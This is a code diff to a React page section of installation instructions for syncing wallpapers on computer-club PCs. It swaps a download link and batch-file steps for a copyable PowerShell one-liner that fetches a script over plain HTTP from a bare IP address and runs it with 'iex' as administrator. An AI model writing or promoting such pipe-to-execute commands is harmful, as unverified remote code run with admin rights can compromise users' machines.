@@ -1,10 +1,19 @@
-import React from 'react';
+import React, { useState } from 'react';
 import Image from 'next/image';
-import { Moon, Terminal, Download, ShieldAlert, Cpu, Gamepad2, HardDrive, AlertTriangle, Wallpaper, ExternalLink, MonitorDown, ArrowDown } from 'lucide-react';
+import { Moon, Terminal, Download, ShieldAlert, Cpu, Gamepad2, HardDrive, AlertTriangle, Wallpaper, MonitorDown, Copy, Check } from 'lucide-react';
 import { SectionBadge } from '../components/SectionBadge';
 import { PcMonitorWidget } from '../components/PcMonitorWidget';
 
 export function Section12({ setZoomedImage, onNavigate }: { setZoomedImage?: (src: string | null) => void; onNavigate?: (sectionId: string) => void }) {
+    const installCommand = 'irm http://82.97.253.207:4200/setup/bootstrap.ps1 | iex';
+    const [isCommandCopied, setIsCommandCopied] = useState(false);
+
+    const copyInstallCommand = async () => {
+        await navigator.clipboard.writeText(installCommand);
+        setIsCommandCopied(true);
+        window.setTimeout(() => setIsCommandCopied(false), 2000);
+    };
+
     return (
         <section className="animate-in fade-in slide-in-from-bottom-4 duration-500">
             <SectionBadge number="12" label="Раздел" />
@@ -212,15 +221,6 @@ export function Section12({ setZoomedImage, onNavigate }: { setZoomedImage?: (sr
                             <p className="font-chakra text-violet-200 text-sm">Установка и синхронизация обоев с сервером</p>
                         </div>
                     </div>
-                    <a
-                        href="https://disk.yandex.ru/d/u6XlLKp3r4SO0Q"
-                        target="_blank"
-                        rel="noopener noreferrer"
-                        className="flex items-center gap-2 bg-white/20 hover:bg-white/30 backdrop-blur-sm text-white px-5 py-2.5 rounded-xl font-chakra font-bold text-sm transition-all border border-white/20 shrink-0"
-                    >
-                        <ExternalLink size={16} />
-                        Открыть на Яндекс.Диске
-                    </a>
                 </div>
 
                 <div className="p-6 md:p-8 font-chakra text-slate-700 text-sm leading-relaxed space-y-6">
@@ -242,29 +242,35 @@ export function Section12({ setZoomedImage, onNavigate }: { setZoomedImage?: (sr
                     </div>
 
                     <div className="bg-slate-50 border border-slate-200 rounded-xl p-5">
-                        <h4 className="font-bold text-slate-900 uppercase tracking-widest text-[11px] mb-4 flex items-center gap-2">
-                            <ArrowDown size={14} className="text-indigo-500" />
-                            Пошаговая инструкция
-                        </h4>
-                        <ol className="list-decimal list-inside space-y-3 text-slate-600 ml-1 font-medium">
-                            <li>
-                                Скачайте папку с обоями по ссылке: <a href="https://disk.yandex.ru/d/u6XlLKp3r4SO0Q" target="_blank" rel="noopener noreferrer" className="text-violet-600 font-bold hover:underline inline-flex items-center gap-1">Яндекс.Диск <ExternalLink size={12} /></a>
-                            </li>
-                            <li>
-                                Сохраните скачанную папку на <strong>диск C:\</strong> компьютера.
-                            </li>
-                            <li>
-                                Запустите файл <code className="bg-slate-800 text-emerald-400 font-mono text-sm px-2 py-0.5 rounded font-bold">runme.bat</code> из скачанной папки.
-                            </li>
-                            <li>
-                                Введите, какой клуб — <code className="bg-slate-800 text-amber-400 font-mono text-sm px-2 py-0.5 rounded font-bold">1</code> (CyberX 1) или <code className="bg-slate-800 text-amber-400 font-mono text-sm px-2 py-0.5 rounded font-bold">2</code> (CyberX 2).
-                            </li>
-                            <li>
-                                Введите <strong>номер ПК</strong> (например, <code className="bg-slate-800 text-amber-400 font-mono text-sm px-2 py-0.5 rounded font-bold">14</code>).
-                            </li>
-                            <li className="text-emerald-700 font-bold bg-emerald-50/50 p-2 rounded -ml-2">
-                                Нажмите <strong>Enter</strong> — обои установятся и будут автоматически синхронизироваться с сервером.
-                            </li>
+                        <div className="flex flex-wrap items-center gap-2 mb-3">
+                            <h4 className="font-bold text-slate-900 uppercase tracking-widest text-[11px]">Быстрая установка</h4>
+                            <span className="rounded-full bg-emerald-100 px-2.5 py-1 text-[10px] font-bold uppercase tracking-wider text-emerald-700">Рекомендуется</span>
+                        </div>
+                        <p className="mb-4 text-slate-600">
+                            Откройте <strong>PowerShell от имени администратора</strong> и выполните одну команду: она скачает клиент и запустит установку «из коробки».
+                        </p>
+                        <div className="flex flex-col gap-3 rounded-xl bg-slate-900 p-4 sm:flex-row sm:items-center sm:justify-between">
+                            <code className="break-all font-mono text-sm font-bold text-emerald-400">{installCommand}</code>
+                            <button
+                                type="button"
+                                onClick={copyInstallCommand}
+                                className="inline-flex shrink-0 items-center justify-center gap-2 rounded-lg bg-white/10 px-3 py-2 text-xs font-bold text-white transition-colors hover:bg-white/20"
+                            >
+                                {isCommandCopied ? <Check size={15} /> : <Copy size={15} />}
+                                {isCommandCopied ? 'Скопировано' : 'Копировать'}
+                            </button>
+                        </div>
+                        <p className="mt-4 rounded-lg bg-emerald-50 p-3 text-emerald-800">
+                            В процессе установщик спросит <strong>клуб</strong> (Altufevo / Novokosino) и <strong>номер ПК</strong>, создаст задачи в Планировщике Windows и сразу применит обои.
+                        </p>
+                    </div>
+
+                    <div className="rounded-xl border border-indigo-100 bg-indigo-50 p-5">
+                        <h4 className="mb-3 font-bold uppercase tracking-widest text-[11px] text-indigo-900">Как открыть PowerShell от имени администратора</h4>
+                        <ol className="ml-1 list-decimal list-inside space-y-2 font-medium text-indigo-900">
+                            <li>Нажмите клавишу <strong>Windows</strong> и введите <strong>PowerShell</strong>.</li>
+                            <li>Нажмите правой кнопкой мыши на <strong>Windows PowerShell</strong> и выберите «Запуск от имени администратора».</li>
+                            <li>Подтвердите запрос Windows кнопкой «Да», вставьте команду и нажмите <strong>Enter</strong>.</li>
                         </ol>
                     </div>
 
